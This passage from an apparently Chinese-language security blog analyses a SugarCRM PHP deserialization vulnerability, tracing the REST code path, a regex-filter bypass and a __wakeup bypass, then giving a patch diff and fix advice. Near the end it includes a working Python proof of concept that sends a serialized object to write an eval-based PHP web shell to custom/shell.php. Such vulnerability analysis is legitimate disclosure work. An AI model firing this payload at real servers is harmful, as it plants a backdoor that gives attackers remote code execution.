*/</span></span><br></pre></td></tr></table></figure><p>重点看一下<code>sugar_unserialize</code>方法，<code>PHPSTORM</code>的话，直接圈住这个方法名，<code>Command+B</code>就跳转到该方法了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Performs unserialization. Accepts all types except Objects</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $value Serialized value of any type except Object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed False if Object, converted value for other cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value, $matches);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到注释中写到的是，（翻译）<code>执行反序列化。接受除对象外的所有类型</code>，读一下正则，可以看到只是过滤了<code>o:123</code>这样的形式，但是并没有过滤完整，可以通过<code>o:+123123</code>的方式绕过（<a href="http://139.129.31.35/index.php/archives/382/" target="_blank" rel="noopener">以前php4fun做过一道类似的</a>）</p><p>不难发现，如果我们想要利用这个漏洞，需要传入<code>rest_data</code>，<code>method</code>。<code>serve</code>函数的作用就是在实施代码的类中调用指定的方法，并且返回结果。</p><p>顺着这个思路找一下哪里调用我们的<code>serve</code>方法。这个时候看一下目录结构，发现我们找到的漏洞触发点在<code>/service/core/REST</code>目录下：<img src="media/14858321993840/1.png" alt="1"></p><p>打开<code>v2v3v4</code>中的一个目录中的<code>rest.php</code>文件，发现这是不同版本rest的入口文件，主要提供了<code>sugarcrm</code>的<code>webserver</code>服务。</p><blockquote><p>这边说的是看目录结构的思路，其实比较简单的方法就是全局搜索<code>service/core/</code>，来查看哪些地方<code>require</code>了该文件，配合查看目录结构，非常的方便。</p></blockquote><p>在这里我们可以想到整个<code>service</code>目录就是提供网络服务的目录，跟一下<code>rest.php</code>中的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'../..'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarWebServiceImplv4.php'</span>);</span><br><span class="line">$webservice_class = <span class="string">'SugarRestService'</span>;</span><br><span class="line">$webservice_path = <span class="string">'service/core/SugarRestService.php'</span>;</span><br><span class="line">$webservice_impl_class = <span class="string">'SugarWebServiceImplv4'</span>;</span><br><span class="line">$registry_class = <span class="string">'registry'</span>;</span><br><span class="line">$location = <span class="string">'/service/v4/rest.php'</span>;</span><br><span class="line">$registry_path = <span class="string">'service/v4/registry.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/webservice.php'</span>);</span><br></pre></td></tr></table></figure><p>前面都是一些变量的初始化，直接跟进<code>service/core/webservice.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">chdir(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../../'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/entryPoint.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'soap/SoapError.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SoapHelperWebService.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarRestUtils.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>($webservice_path);</span><br><span class="line"><span class="keyword">require_once</span>($registry_path);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($webservice_impl_class_path))</span><br><span class="line">    <span class="keyword">require_once</span>($webservice_impl_class_path);</span><br><span class="line">$url = $GLOBALS[<span class="string">'sugar_config'</span>][<span class="string">'site_url'</span>].$location;</span><br><span class="line">$service = <span class="keyword">new</span> $webservice_class($url);</span><br><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the service object in the global scope so that any error, if happens, can be set on this object</span></span><br><span class="line"><span class="keyword">global</span> $service_object;</span><br><span class="line">$service_object = $service;</span><br><span class="line"></span><br><span class="line">$service-&gt;serve();</span><br></pre></td></tr></table></figure><p>根据前面的变量定义，这里我们可以明显的看出调用关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = ip地址/service/v4/rest.php</span><br><span class="line">$service = <span class="keyword">new</span> SugarRestService($url)</span><br></pre></td></tr></table></figure><p>跟进<code>service/core/SugarRestService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;__construct'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;restURL = $url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;responseClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'response_type'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;serverClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'input_type'</span>]);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'SugarRestService-&gt;__construct serverclass = '</span> . <span class="keyword">$this</span>-&gt;serverClass);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;serverClass . <span class="string">'.php'</span>);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;__construct'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下<code>_getTypeName</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getTypeName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($name)) <span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line"></span><br><span class="line">$name = clean_string($name, <span class="string">'ALPHANUM'</span>);</span><br><span class="line">$type = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">switch</span>(strtolower($name)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'json'</span>:</span><br><span class="line">$type = <span class="string">'JSON'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'rss'</span>:</span><br><span class="line">$type = <span class="string">'RSS'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'serialize'</span>:</span><br><span class="line">$type = <span class="string">'Serialize'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">$classname = <span class="string">"SugarRest$type"</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'service/core/REST/'</span> . $classname . <span class="string">'.php'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $classname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以通过构造<code>input_type = serialize</code>来使<code>$this-&gt;serverClass = SugarRestSerialize</code>，接下来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br></pre></td></tr></table></figure><p>将<code>SugarRestSerialize</code>类进行注册，在这三个函数调用的过程中在<code>registerImplClass</code>方法中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;server = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;serverClass(<span class="keyword">$this</span>-&gt;implementation);</span><br></pre></td></tr></table></figure><p>在最后调用<code>$service-&gt;serve();</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;responseClass . <span class="string">'.php'</span>);</span><br><span class="line">$response  = <span class="keyword">$this</span>-&gt;responseClass;</span><br><span class="line"></span><br><span class="line">$responseServer = <span class="keyword">new</span> $response(<span class="keyword">$this</span>-&gt;implementation);</span><br><span class="line"><span class="keyword">$this</span>-&gt;server-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;generateResponse(<span class="keyword">$this</span>-&gt;server-&gt;serve());</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;serve'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());</code>也就是调用了<code>SugarRestSerialize.php</code>中的<code>serve</code>方法，从而将我们构造好的序列化参数传递过去。</p><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>从上面的分析中，我们已经知道了从哪里传入构造的序列化，传输过程。现在需要找的就是漏洞利用点，也就是漏洞触发点。</p><p>我们都知道现在只需要在序列化参数中传入需要反序列化的文件名，以及方法名，就可以将构造好的poc传递过去。</p><blockquote><p>关于找漏洞触发点，可以全局搜索危险函数名，以及通读代码来完成（耗费很多时间，并且没有一定的经验容易乱）。</p></blockquote><p>在<code>include/SugarCache/SugarCacheFile.php</code>找到漏洞利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::__destruct();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;_cacheChanged )</span><br><span class="line">        sugar_file_put_contents(sugar_cached(<span class="keyword">$this</span>-&gt;_cacheFileName), serialize(<span class="keyword">$this</span>-&gt;_localStore));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This is needed to prevent unserialize vulnerability</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// clean all properties</span></span><br><span class="line">    <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Not a serializable object"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>__wakeup</code>魔术方法中，会将我们传递过来的数据清零，现在需要绕过该魔术方法，利用构造的序列化参数实现<code>__destrcut</code>中的写操作，绕过方法利用的就是<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a>。</p><p>在来看一下<code>sugar_file_put_contents</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_file_put_contents</span><span class="params">($filename, $data, $flags=null, $context=null)</span></span>&#123;  </span><br><span class="line">    <span class="comment">//check to see if the file exists, if not then use touch to create it.</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($filename))&#123;</span><br><span class="line">        sugar_touch($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !is_writable($filename) ) &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'log'</span>]-&gt;error(<span class="string">"File $filename cannot be written to"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($flags)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">empty</span>($context)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags, $context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数并没有对文件内容或者扩展名等进行限制，虽然参数<code>$data</code>是serialize(<code>$this-&gt;_localStore</code>)，也就是序列化后的数据，但是我们可以设置<code>$_this-&gt;_localStore</code>为一个数组，把payload作为数组中的一个值，就可以完整保存payload。（反正就是执行一个写操作，php序列化数组后并不会对数组的值进行干扰）</p><p>所以，传入一个<code>SugarCacheFile</code>对象，并设置其属性的值，就能进行写文件操作。</p><p>demo的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1:8788/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/shell.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;Lucifaer\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure><p>shell在<code>custom/shell.php</code></p><p>恩，就是这样了。</p><h1 id="0x03-补丁diff"><a href="#0x03-补丁diff" class="headerlink" title="0x03 补丁diff"></a>0x03 补丁diff</h1><p>在v6.5.24中，对<code>sugar_unserialize</code>进行了如下改进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:[^:]*\d+:/i'</span>, $value, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了前面的分析，可以看到对象类型的序列化参数无法禁止反序列化了。</p><h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><p>升级SugarCRM到最新版本</p><p>对于php版本的升级并不是很建议，因为在一些高版本的php上，环境搭建可能会出现问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;免费广告…..推荐使用&lt;code&gt;PHPSTORM+Xdebug&lt;/code&gt;来分析漏洞，下面的过程都是利用&lt;code&gt;PHPSTORM&lt;/code&gt;来分析的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
